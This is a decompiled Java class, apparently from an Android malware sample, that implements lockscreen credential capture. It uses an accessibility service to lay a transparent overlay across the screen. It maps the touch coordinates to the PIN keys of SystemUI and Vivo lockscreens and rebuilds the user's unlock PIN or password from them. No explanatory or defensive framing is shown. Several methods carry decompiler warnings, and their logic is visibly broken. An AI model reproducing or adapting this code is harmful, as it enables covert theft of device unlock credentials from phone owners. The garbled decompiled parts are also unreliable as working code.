package com.storm.safe.rock.service.modules.cipher;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Rect;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import com.storm.safe.rock.service.modules.cipher.CipherExtractor;
import com.storm.safe.rock.service.modules.cipher.UiObject;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Comparator;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Objects;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import kotlin.Pair;
import kotlin.collections.AbstractC0770a1;
import kotlin.collections.EmptyList;
import kotlin.text.AbstractC0779a1;
import p000.AbstractC0715je;
import p000.AbstractC0717jg;
import p000.AbstractC0720jj;
import p000.AbstractC1095q3;
import p000.C1351vv;
import p000.RunnableC0941o6;
import p000.RunnableC1053p2;
import p000.h10;
import p000.l10;
import p000.m21;
import p000.m71;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.cipher.a5 */
/* loaded from: classes2.dex */
public final class C0339a5 {

    /* renamed from: a0 */
    public static WindowManager f53362a0;

    /* renamed from: a3 */
    public static ListenHelper f53365a3;

    /* renamed from: a5 */
    public static int f53367a5;

    /* renamed from: a6 */
    public static int f53368a6;

    /* renamed from: a7 */
    public static AccessibilityService f53369a7;

    /* renamed from: a9 */
    public static boolean f53371a9;

    /* renamed from: b0 */
    public static int f53372b0;

    /* renamed from: b2 */
    public static volatile boolean f53374b2;

    /* renamed from: b3 */
    public static int f53375b3;

    /* renamed from: b7 */
    public static volatile boolean f53379b7;

    /* renamed from: a1 */
    public static final AtomicReference f53363a1 = new AtomicReference(null);

    /* renamed from: a2 */
    public static final CipherDataHolder f53364a2 = new CipherDataHolder();

    /* renamed from: a4 */
    public static volatile int f53366a4 = -1;

    /* renamed from: a8 */
    public static final Handler f53370a8 = new Handler(Looper.getMainLooper());

    /* renamed from: b1 */
    public static final CopyOnWriteArrayList f53373b1 = new CopyOnWriteArrayList();

    /* renamed from: b4 */
    public static final int f53376b4 = 5;

    /* renamed from: b5 */
    public static final AtomicReference f53377b5 = new AtomicReference(null);

    /* renamed from: b6 */
    public static final AtomicReference f53378b6 = new AtomicReference(null);

    /* renamed from: a0 */
    public static void m211852a0() {
        int i;
        Object next;
        UiObject uiObjectCreateRoot;
        UiObject uiObjectCreateRoot2;
        AccessibilityService accessibilityService = f53369a7;
        if (accessibilityService == null) {
            return;
        }
        if (f53363a1.get() != null || f53371a9) {
            f53373b1.clear();
            f53377b5.set(null);
            f53378b6.set(null);
            ArrayList arrayList = new ArrayList();
            int i2 = 0;
            try {
                ArrayList arrayList2 = new ArrayList();
                List<AccessibilityWindowInfo> windows = accessibilityService.getWindows();
                if (windows != null) {
                    for (AccessibilityWindowInfo accessibilityWindowInfo : windows) {
                        UiObject.C0333a0 c0333a0 = UiObject.f53271a6;
                        AccessibilityNodeInfo root = accessibilityWindowInfo.getRoot();
                        if (root != null && (uiObjectCreateRoot2 = c0333a0.createRoot(root)) != null) {
                            arrayList2.add(uiObjectCreateRoot2);
                        }
                    }
                }
                if (arrayList2.isEmpty() && (uiObjectCreateRoot = UiObject.f53271a6.createRoot(accessibilityService.getRootInActiveWindow())) != null) {
                    arrayList2.add(uiObjectCreateRoot);
                }
                int size = arrayList2.size();
                int i3 = 0;
                while (i3 < size) {
                    Object obj = arrayList2.get(i3);
                    i3++;
                    UiObject uiObject = (UiObject) obj;
                    m211853a1(uiObject, arrayList);
                    if (f53377b5.get() == null) {
                        m211856a4(uiObject, true);
                    }
                    if (f53378b6.get() == null) {
                        m211856a4(uiObject, false);
                    }
                }
            } catch (Exception unused) {
            }
            LinkedHashMap linkedHashMap = new LinkedHashMap();
            int size2 = arrayList.size();
            int i4 = 0;
            while (i4 < size2) {
                Object obj2 = arrayList.get(i4);
                i4++;
                Integer numValueOf = Integer.valueOf(((m71) obj2).f58283a0);
                Object arrayList3 = linkedHashMap.get(numValueOf);
                if (arrayList3 == null) {
                    arrayList3 = new ArrayList();
                    linkedHashMap.put(numValueOf, arrayList3);
                }
                ((List) arrayList3).add(obj2);
            }
            LinkedHashMap linkedHashMap2 = new LinkedHashMap(AbstractC0770a1.m213612f7(linkedHashMap.size()));
            for (Map.Entry entry : linkedHashMap.entrySet()) {
                Object key = entry.getKey();
                Iterator it = ((List) entry.getValue()).iterator();
                if (it.hasNext()) {
                    next = it.next();
                    if (it.hasNext()) {
                        m71 m71Var = (m71) next;
                        int iHeight = m71Var.f58284a1.height() * m71Var.f58284a1.width();
                        do {
                            Object next2 = it.next();
                            m71 m71Var2 = (m71) next2;
                            int iHeight2 = m71Var2.f58284a1.height() * m71Var2.f58284a1.width();
                            if (iHeight < iHeight2) {
                                next = next2;
                                iHeight = iHeight2;
                            }
                        } while (it.hasNext());
                    }
                } else {
                    next = null;
                }
                linkedHashMap2.put(key, (m71) next);
            }
            Collection collectionValues = linkedHashMap2.values();
            t60.m214695b6(collectionValues, "<this>");
            ArrayList arrayList4 = new ArrayList();
            for (Object obj3 : collectionValues) {
                if (obj3 != null) {
                    arrayList4.add(obj3);
                }
            }
            f53373b1.addAll(arrayList4);
            f53374b2 = arrayList4.size() >= 10;
            m71 m71Var3 = (m71) f53377b5.get();
            if (m71Var3 != null) {
                String str = "id=" + m71Var3.f58285a2 + ", desc=" + m71Var3.f58287a4;
            }
            arrayList4.size();
            ArrayList arrayList5 = new ArrayList(AbstractC0717jg.m213310g9(arrayList4));
            int size3 = arrayList4.size();
            while (i2 < size3) {
                Object obj4 = arrayList4.get(i2);
                i2++;
                arrayList5.add(Integer.valueOf(((m71) obj4).f58283a0));
            }
            Objects.toString(AbstractC0715je.m213299i6(arrayList5));
            if (f53374b2 || (i = f53375b3) >= f53376b4) {
                if (f53374b2) {
                    return;
                }
                f53379b7 = true;
            } else {
                int i5 = i + 1;
                f53375b3 = i5;
                f53370a8.postDelayed(new RunnableC1053p2(5), i5 * 400);
            }
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:45:0x00bd  */
    /* JADX WARN: Removed duplicated region for block: B:54:0x00c0 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:60:0x0018 A[ADDED_TO_REGION, REMOVE, SYNTHETIC] */
    /* renamed from: a1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static void m211853a1(UiObject uiObject, ArrayList arrayList) {
        int iIntValue;
        Character chM213936e4;
        char cCharAt;
        uiObject.getClass();
        TouchViewManager$collectDigitButtons$1 touchViewManager$collectDigitButtons$1 = new h10() { // from class: com.storm.safe.rock.service.modules.cipher.TouchViewManager$collectDigitButtons$1
            @Override // p000.h10
            public final Object invoke(Object obj) {
                Character chM213936e42;
                UiObject uiObject2 = (UiObject) obj;
                t60.m214695b6(uiObject2, "node");
                if (!uiObject2.m211781a7()) {
                    return Boolean.FALSE;
                }
                String strM211782a8 = uiObject2.m211782a8();
                String string = strM211782a8 != null ? AbstractC0779a1.m213687e0(strM211782a8).toString() : null;
                String strM211775a1 = uiObject2.m211775a1();
                String string2 = strM211775a1 != null ? AbstractC0779a1.m213687e0(strM211775a1).toString() : null;
                String strM211780a6 = uiObject2.m211780a6();
                if (strM211780a6 == null) {
                    strM211780a6 = "";
                }
                boolean z = false;
                if ((string != null && string.length() == 1 && Character.isDigit(string.charAt(0))) || ((string2 != null && string2.length() == 1 && Character.isDigit(string2.charAt(0))) || (AbstractC0779a1.m213652a5(strM211780a6, ":id/", false) && !AbstractC0779a1.m213652a5(strM211780a6, "delete", true) && !AbstractC0779a1.m213652a5(strM211780a6, "enter", true) && !AbstractC0779a1.m213652a5(strM211780a6, "cancel", true) && (chM213936e42 = m21.m213936e4(strM211780a6)) != null && Character.isDigit(chM213936e42.charValue())))) {
                    z = true;
                }
                return Boolean.valueOf(z);
            }
        };
        t60.m214695b6(touchViewManager$collectDigitButtons$1, "filter");
        ArrayList arrayList2 = new ArrayList();
        uiObject.m211776a2(touchViewManager$collectDigitButtons$1, arrayList2);
        int size = arrayList2.size();
        int i = 0;
        while (i < size) {
            Object obj = arrayList2.get(i);
            i++;
            UiObject uiObject2 = (UiObject) obj;
            Rect rectM211774a0 = uiObject2.m211774a0();
            if (rectM211774a0 != null && rectM211774a0.width() >= 10 && rectM211774a0.height() >= 10) {
                String strM211782a8 = uiObject2.m211782a8();
                if (strM211782a8 == null) {
                    strM211782a8 = "";
                }
                String string = AbstractC0779a1.m213687e0(strM211782a8).toString();
                String strM211775a1 = uiObject2.m211775a1();
                if (strM211775a1 == null) {
                    strM211775a1 = "";
                }
                String string2 = AbstractC0779a1.m213687e0(strM211775a1).toString();
                String strM211780a6 = uiObject2.m211780a6();
                String str = strM211780a6 != null ? strM211780a6 : "";
                if (string.length() == 1 && Character.isDigit(string.charAt(0))) {
                    cCharAt = string.charAt(0);
                } else if (string2.length() == 1 && Character.isDigit(string2.charAt(0))) {
                    cCharAt = string2.charAt(0);
                } else if (AbstractC0779a1.m213652a5(str, ":id/", false) && (chM213936e4 = m21.m213936e4(str)) != null && Character.isDigit(chM213936e4.charValue())) {
                    int iDigit = Character.digit((int) m21.m213935e3(str), 10);
                    Integer numValueOf = Integer.valueOf(iDigit);
                    if (iDigit < 0) {
                        numValueOf = null;
                    }
                    if (numValueOf != null) {
                        iIntValue = numValueOf.intValue();
                    }
                    if (iIntValue >= 0) {
                    }
                } else {
                    iIntValue = -1;
                    if (iIntValue >= 0 && iIntValue < 10) {
                        arrayList.add(new m71(iIntValue, rectM211774a0, str, string, string2, uiObject2.f53272a0));
                    }
                }
                iIntValue = cCharAt - '0';
                if (iIntValue >= 0) {
                }
            }
        }
    }

    /* renamed from: a2 */
    public static void m211854a2(AccessibilityService accessibilityService) {
        AccessibilityWindowInfo window;
        int identifier;
        try {
            if (f53363a1.get() != null) {
                return;
            }
            f53366a4 = -1;
            CipherDataHolder cipherDataHolder = f53364a2;
            cipherDataHolder.f53227a2.clear();
            cipherDataHolder.f53226a1.clear();
            cipherDataHolder.f53225a0 = ListenHelper.f53238a1.clone(f53365a3);
            f53373b1.clear();
            f53374b2 = false;
            f53375b3 = 0;
            f53379b7 = false;
            Object systemService = accessibilityService.getSystemService("window");
            t60.m214693b4(systemService, "null cannot be cast to non-null type android.view.WindowManager");
            WindowManager windowManager = (WindowManager) systemService;
            android.graphics.Point point = new android.graphics.Point();
            windowManager.getDefaultDisplay().getRealSize(point);
            f53367a5 = point.x;
            try {
                identifier = accessibilityService.getResources().getIdentifier("navigation_bar_height", "dimen", "android");
            } catch (Exception unused) {
            }
            int dimensionPixelSize = identifier > 0 ? accessibilityService.getResources().getDimensionPixelSize(identifier) : 0;
            f53368a6 = point.y - dimensionPixelSize;
            try {
                AccessibilityNodeInfo rootInActiveWindow = accessibilityService.getRootInActiveWindow();
                if (rootInActiveWindow != null && (window = rootInActiveWindow.getWindow()) != null) {
                    Rect rect = new Rect();
                    window.getBoundsInScreen(rect);
                    if (rect.width() > f53367a5) {
                        f53367a5 = rect.width();
                    }
                }
            } catch (Exception unused2) {
            }
            WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams();
            layoutParams.type = 2032;
            layoutParams.format = 1;
            layoutParams.flags = 4786090;
            layoutParams.gravity = 8388659;
            layoutParams.x = 0;
            layoutParams.y = 0;
            layoutParams.width = f53367a5;
            layoutParams.height = f53368a6;
            layoutParams.alpha = 1.0f;
            layoutParams.dimAmount = 0.01f;
            View view = new View(accessibilityService);
            view.setBackgroundColor(0);
            view.setAlpha(1.0f);
            view.setOnTouchListener(new ViewOnTouchListenerC0338a4());
            if (f53362a0 == null) {
                f53362a0 = windowManager;
            }
            WindowManager windowManager2 = f53362a0;
            if (windowManager2 != null) {
                windowManager2.addView(view, layoutParams);
            }
            f53363a1.set(view);
            f53372b0 = 0;
            f53370a8.postDelayed(new RunnableC1053p2(4), 300L);
        } catch (Exception unused3) {
        }
    }

    /* renamed from: a3 */
    public static UiObject m211855a3(AccessibilityService accessibilityService, float f, float f2) {
        UiObject uiObjectCreateRoot;
        UiObject uiObjectM211777a3;
        t60.m214695b6(accessibilityService, "svc");
        try {
            List<AccessibilityWindowInfo> windows = accessibilityService.getWindows();
            if (windows != null && !windows.isEmpty()) {
                Iterator<AccessibilityWindowInfo> it = windows.iterator();
                while (it.hasNext()) {
                    AccessibilityNodeInfo root = it.next().getRoot();
                    if (root != null && (uiObjectCreateRoot = UiObject.f53271a6.createRoot(root)) != null && (uiObjectM211777a3 = uiObjectCreateRoot.m211777a3(f, f2)) != null) {
                        return uiObjectM211777a3;
                    }
                }
            }
            UiObject uiObjectCreateRoot2 = UiObject.f53271a6.createRoot(accessibilityService.getRootInActiveWindow());
            if (uiObjectCreateRoot2 == null) {
                return null;
            }
            return uiObjectCreateRoot2.m211777a3(f, f2);
        } catch (Exception unused) {
            return null;
        }
    }

    /* renamed from: a4 */
    public static void m211856a4(UiObject uiObject, boolean z) {
        Rect rectM211774a0;
        UiObject uiObjectM211778a4 = uiObject.m211778a4(new TouchViewManager$findSpecialKey$node$1(z));
        if (uiObjectM211778a4 != null && (rectM211774a0 = uiObjectM211778a4.m211774a0()) != null && rectM211774a0.width() >= 10 && rectM211774a0.height() >= 10) {
            int i = z ? -1 : -2;
            String strM211780a6 = uiObjectM211778a4.m211780a6();
            if (strM211780a6 == null) {
                strM211780a6 = "";
            }
            String strM211782a8 = uiObjectM211778a4.m211782a8();
            if (strM211782a8 == null) {
                strM211782a8 = "";
            }
            String strM211775a1 = uiObjectM211778a4.m211775a1();
            (z ? f53377b5 : f53378b6).set(new m71(i, rectM211774a0, strM211780a6, strM211782a8, strM211775a1 != null ? strM211775a1 : "", uiObjectM211778a4.f53272a0));
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:23:0x0098  */
    /* renamed from: a5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static void m211857a5(List list, boolean z, boolean z2) {
        boolean z3;
        if (z2) {
            try {
                if (!list.isEmpty()) {
                    list.size();
                    CipherDataHolder cipherDataHolder = f53364a2;
                    cipherDataHolder.f53227a2.clear();
                    cipherDataHolder.f53227a2.addAll(list);
                    cipherDataHolder.f53226a1.clear();
                    Iterator it = list.iterator();
                    int i = 0;
                    while (it.hasNext()) {
                        int i2 = i + 1;
                        Point point = (Point) it.next();
                        f53364a2.f53226a1.add(new ListenPropResponse(Integer.valueOf(i), "adb_coord", point.f53261a0 + "," + point.f53262a1, Long.valueOf(System.nanoTime())));
                        i = i2;
                    }
                    f53366a4 = list.size() - 1;
                    CipherDataHolder cipherDataHolder2 = f53364a2;
                    if (cipherDataHolder2.f53225a0 == null) {
                        ListenHelper listenHelper = new ListenHelper();
                        listenHelper.f53239a0 = 2;
                        cipherDataHolder2.f53225a0 = listenHelper;
                    }
                }
            } catch (Exception unused) {
                return;
            }
        }
        CipherDataHolder cipherDataHolder3 = f53364a2;
        synchronized (cipherDataHolder3) {
            if (cipherDataHolder3.f53226a1.isEmpty()) {
                z3 = !cipherDataHolder3.f53227a2.isEmpty();
            }
        }
        if (z && z3) {
            cipherDataHolder3.m211772a0(new h10() { // from class: com.storm.safe.rock.service.modules.cipher.TouchViewManager$handleTeardownData$2
                @Override // p000.h10
                public final Object invoke(Object obj) {
                    String string;
                    boolean z4;
                    Character chM213936e4;
                    LinkedList linkedList = (LinkedList) obj;
                    t60.m214695b6(linkedList, "it");
                    CipherExtractor.f53228a0.getClass();
                    if (!linkedList.isEmpty()) {
                        LinkedList linkedList2 = new LinkedList();
                        LinkedList linkedList3 = new LinkedList();
                        LinkedList linkedList4 = new LinkedList();
                        LinkedList linkedList5 = new LinkedList();
                        LinkedList linkedList6 = new LinkedList();
                        Iterator it2 = linkedList.iterator();
                        while (it2.hasNext()) {
                            String str = ((ListenPropResponse) it2.next()).f53242a2;
                            if (str != null && (string = AbstractC0779a1.m213687e0(str).toString()) != null && string.length() != 0) {
                                if (!AbstractC0779a1.m213679d2(string, false, "com.android.systemui:id/key") || AbstractC0779a1.m213652a5(string, "key_enter", false) || AbstractC0779a1.m213652a5(string, "key_delete", false)) {
                                    z4 = false;
                                } else {
                                    linkedList2.add(AbstractC0779a1.m213682d5(string, "com.android.systemui:id/key"));
                                    z4 = true;
                                }
                                if (AbstractC0779a1.m213679d2(string, false, "com.android.systemui:id/VivoPinkey")) {
                                    linkedList3.add(AbstractC0779a1.m213682d5(string, "com.android.systemui:id/VivoPinkey"));
                                    z4 = true;
                                }
                                if (AbstractC0779a1.m213679d2(string, false, "com.android.systemui:id/num")) {
                                    linkedList4.add(AbstractC0779a1.m213682d5(string, "com.android.systemui:id/num"));
                                    z4 = true;
                                }
                                if (AbstractC0779a1.m213679d2(string, false, "com.android.systemui:id/char_")) {
                                    linkedList4.add(AbstractC0779a1.m213682d5(string, "com.android.systemui:id/char_"));
                                    z4 = true;
                                }
                                if (!z4 && AbstractC0779a1.m213652a5(string, ":id/", false) && !AbstractC0779a1.m213652a5(string, "delete", true) && !AbstractC0779a1.m213652a5(string, "enter", true) && !AbstractC0779a1.m213652a5(string, "cancel", true) && (chM213936e4 = m21.m213936e4(string)) != null && Character.isDigit(chM213936e4.charValue())) {
                                    linkedList5.add(chM213936e4.toString());
                                    z4 = true;
                                }
                                if (!z4 && string.length() == 1 && Character.isDigit(string.charAt(0))) {
                                    linkedList6.add(string);
                                }
                            }
                        }
                        Pair pair = !linkedList2.isEmpty() ? new Pair(linkedList2, "SystemUI") : !linkedList3.isEmpty() ? new Pair(linkedList3, "Vivo") : !linkedList4.isEmpty() ? new Pair(linkedList4, "num/char") : !linkedList5.isEmpty() ? new Pair(linkedList5, "ID尾数字") : !linkedList6.isEmpty() ? new Pair(linkedList6, "单数字") : null;
                        if (pair != null) {
                            LinkedList linkedList7 = (LinkedList) pair.f57556a0;
                            String strJoin = TextUtils.join("", linkedList7);
                            CipherResult cipherResult = new CipherResult();
                            cipherResult.f53233a0 = strJoin;
                            CipherExtractor.f53228a0.getClass();
                            cipherResult.f53235a2 = CipherExtractor.m211773a0(strJoin) ? "PASSWORD_QUALITY_NUMERIC_COMPLEX" : "PASSWORD_QUALITY_ALPHANUMERIC";
                            return cipherResult;
                        }
                    }
                    return null;
                }
            }, new h10() { // from class: com.storm.safe.rock.service.modules.cipher.TouchViewManager$handleTeardownData$3
                /* JADX WARN: Removed duplicated region for block: B:23:0x004d  */
                /* JADX WARN: Removed duplicated region for block: B:49:0x00af  */
                @Override // p000.h10
                /*
                    Code decompiled incorrectly, please refer to instructions dump.
                */
                public final Object invoke(Object obj) {
                    boolean z4;
                    String string;
                    LinkedList linkedList = (LinkedList) obj;
                    t60.m214695b6(linkedList, "it");
                    CipherExtractor.f53228a0.getClass();
                    if (!linkedList.isEmpty()) {
                        if (linkedList.isEmpty()) {
                            z4 = true;
                            if (z4) {
                                LinkedList linkedList2 = new LinkedList();
                                LinkedList linkedList3 = CipherExtractor.f53229a1;
                                synchronized (linkedList3) {
                                    if (!linkedList3.isEmpty()) {
                                        linkedList2.addAll(linkedList3);
                                        linkedList3.clear();
                                    }
                                }
                                linkedList2.addAll(linkedList);
                                if (!linkedList2.isEmpty()) {
                                    LinkedList linkedList4 = new LinkedList();
                                    Iterator it2 = linkedList2.iterator();
                                    while (it2.hasNext()) {
                                        String str = ((ListenPropResponse) it2.next()).f53242a2;
                                        if (!(str == null || str.length() == 0)) {
                                            linkedList4.add(str);
                                        }
                                    }
                                    final CipherExtractor$extractByText$3 cipherExtractor$extractByText$3 = new l10() { // from class: com.storm.safe.rock.service.modules.cipher.CipherExtractor$extractByText$3
                                        @Override // p000.l10
                                        public final Object invoke(Object obj2, Object obj3) {
                                            return Integer.valueOf(((String) obj2).length() - ((String) obj3).length());
                                        }
                                    };
                                    AbstractC0720jj.m213313h1(linkedList4, new Comparator() { // from class: ib
                                        @Override // java.util.Comparator
                                        public final int compare(Object obj2, Object obj3) {
                                            CipherExtractor cipherExtractor = CipherExtractor.f53228a0;
                                            l10 l10Var = cipherExtractor$extractByText$3;
                                            t60.m214695b6(l10Var, "$tmp0");
                                            return ((Number) l10Var.invoke(obj2, obj3)).intValue();
                                        }
                                    });
                                    if (!linkedList4.isEmpty()) {
                                        Iterator it3 = linkedList4.iterator();
                                        int length = 0;
                                        while (it3.hasNext()) {
                                            String str2 = (String) it3.next();
                                            if (!(str2 == null || str2.length() == 0) && str2.length() > length) {
                                                length = str2.length();
                                            }
                                        }
                                        if (length != 0) {
                                            String[] strArr = new String[length];
                                            for (int i3 = 0; i3 < length; i3++) {
                                                strArr[i3] = "*";
                                            }
                                            Iterator it4 = linkedList4.iterator();
                                            while (it4.hasNext()) {
                                                String str3 = (String) it4.next();
                                                if (!(str3 == null || str3.length() == 0)) {
                                                    int length2 = str3.length();
                                                    for (int i4 = 0; i4 < length2; i4++) {
                                                        String strValueOf = String.valueOf(str3.charAt(i4));
                                                        if (!Objects.equals(strValueOf, "*")) {
                                                            strArr[i4] = strValueOf;
                                                        }
                                                    }
                                                }
                                            }
                                            String strJoin = TextUtils.join("", strArr);
                                            if (strJoin != null && strJoin.length() != 0) {
                                                z = false;
                                            }
                                            if (!z) {
                                                t60.m214694b5(strJoin, "join");
                                                if (AbstractC0779a1.m213652a5(strJoin, "*", false) || strJoin.length() != length) {
                                                    LinkedList linkedList5 = CipherExtractor.f53229a1;
                                                    synchronized (linkedList5) {
                                                        linkedList5.addAll(linkedList);
                                                    }
                                                    return null;
                                                }
                                                CipherResult cipherResult = new CipherResult();
                                                cipherResult.f53233a0 = strJoin;
                                                CipherExtractor.f53228a0.getClass();
                                                cipherResult.f53235a2 = CipherExtractor.m211773a0(strJoin) ? "PASSWORD_QUALITY_NUMERIC_COMPLEX" : "PASSWORD_QUALITY_ALPHANUMERIC";
                                                return cipherResult;
                                            }
                                        }
                                    }
                                }
                            } else {
                                StringBuilder sb = new StringBuilder();
                                Iterator it5 = linkedList.iterator();
                                while (it5.hasNext()) {
                                    String str4 = ((ListenPropResponse) it5.next()).f53242a2;
                                    String string2 = str4 != null ? AbstractC0779a1.m213687e0(str4).toString() : null;
                                    if (!(string2 == null || string2.length() == 0)) {
                                        sb.append(string2);
                                    }
                                }
                                String string3 = sb.toString();
                                t60.m214694b5(string3, "sb.toString()");
                                if (string3.length() > 0) {
                                    CipherResult cipherResult2 = new CipherResult();
                                    cipherResult2.f53233a0 = string3;
                                    CipherExtractor.f53228a0.getClass();
                                    cipherResult2.f53235a2 = CipherExtractor.m211773a0(string3) ? "PASSWORD_QUALITY_NUMERIC_COMPLEX" : "PASSWORD_QUALITY_ALPHANUMERIC";
                                    return cipherResult2;
                                }
                            }
                        } else {
                            Iterator it6 = linkedList.iterator();
                            while (it6.hasNext()) {
                                String str5 = ((ListenPropResponse) it6.next()).f53242a2;
                                if (!(((str5 == null || (string = AbstractC0779a1.m213687e0(str5).toString()) == null) ? 0 : string.length()) == 1)) {
                                    z4 = false;
                                    break;
                                }
                            }
                            z4 = true;
                            if (z4) {
                            }
                        }
                    }
                    return null;
                }
            }, new h10() { // from class: com.storm.safe.rock.service.modules.cipher.TouchViewManager$handleTeardownData$4
                @Override // p000.h10
                public final Object invoke(Object obj) {
                    String str = (String) obj;
                    CipherExtractor.f53228a0.getClass();
                    return Boolean.valueOf((str == null || str.length() == 0 || str.length() < 4) ? false : true);
                }
            }, new TouchViewManager$handleTeardownData$5(1));
        } else {
            synchronized (cipherDataHolder3) {
                cipherDataHolder3.f53227a2.clear();
                cipherDataHolder3.f53226a1.clear();
            }
            cipherDataHolder3.f53225a0 = null;
        }
        CipherExtractor.f53228a0.getClass();
        CipherExtractor.f53230a2.set(false);
        cipherDataHolder3.f53225a0 = null;
        f53365a3 = null;
        f53372b0 = 0;
        if (t60.m214686a2(Looper.myLooper(), Looper.getMainLooper())) {
            m211858a6();
        } else {
            f53370a8.post(new RunnableC1053p2(3));
        }
    }

    /* renamed from: a6 */
    public static void m211858a6() {
        try {
            AtomicReference atomicReference = f53363a1;
            View view = (View) atomicReference.get();
            if (f53362a0 != null && view != null) {
                view.setOnTouchListener(null);
                WindowManager windowManager = f53362a0;
                if (windowManager != null) {
                    windowManager.removeViewImmediate(view);
                }
                atomicReference.set(null);
            }
            f53366a4 = -1;
            f53373b1.clear();
            f53377b5.set(null);
            f53378b6.set(null);
            f53374b2 = false;
            f53379b7 = false;
        } catch (Exception unused) {
        }
    }

    /* renamed from: a7 */
    public static void m211859a7(final boolean z) {
        try {
            if (f53363a1.get() != null || f53371a9) {
                if (!f53371a9) {
                    m211857a5(EmptyList.f57568a0, z, false);
                    return;
                }
                f53371a9 = false;
                h10 h10Var = new h10() { // from class: com.storm.safe.rock.service.modules.cipher.TouchViewManager$teardown$1
                    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                    {
                        super(1);
                    }

                    @Override // p000.h10
                    public final Object invoke(Object obj) {
                        List list = (List) obj;
                        t60.m214695b6(list, "adbPoints");
                        WindowManager windowManager = C0339a5.f53362a0;
                        C0339a5.m211857a5(list, z, true);
                        return C1351vv.f60710b1;
                    }
                };
                AtomicBoolean atomicBoolean = AbstractC1095q3.f59371a1;
                if (!atomicBoolean.get()) {
                    h10Var.invoke(AbstractC0715je.m213303j0(AbstractC1095q3.f59370a0));
                } else {
                    atomicBoolean.set(false);
                    AbstractC1095q3.f59372a2.execute(new RunnableC0941o6(1, h10Var));
                }
            }
        } catch (Exception unused) {
        }
    }
}
